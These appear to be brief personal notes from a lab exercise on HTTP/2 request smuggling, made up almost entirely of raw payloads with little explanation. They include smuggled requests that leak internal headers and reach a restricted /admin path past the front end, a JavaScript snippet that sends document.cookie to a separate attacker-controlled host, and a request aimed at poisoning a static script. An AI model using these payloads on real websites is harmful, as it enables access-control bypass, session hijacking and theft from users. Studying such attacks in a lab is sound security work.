




```HTTP
POST / HTTP/2
Host: 10.10.93.232:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Content-Length: 0

GET /post/like/12315198742342 HTTP/1.1
X: f
```




Leaking internal headers 

header foo
```
bar
Host: 10.10.95.208:8100

POST /hello HTTP/1.1
Content-Length: 300
Host: 10.10.95.208:8100
Content-Type: application/x-www-form-urlencoded

q=
```

![](../../../Pasted%20image%2020250823002720.png)

bypass frontend restrictions
```
bar
Host: 10.10.95.208:8100

GET /admin HTTP/1.1
X-fake: a
```



------
```
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       document.getElementById("demo").innerHTML = xhttp.responseText;
    }
};
xhttp.open("GET", "https://10.8.150.149:8002/?c=" + document.cookie, true);
xhttp.send();

```

```GET /static/text.js HTTP/2
Host: 10.10.95.208:8100
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Pragma: no-cache
Foo


```
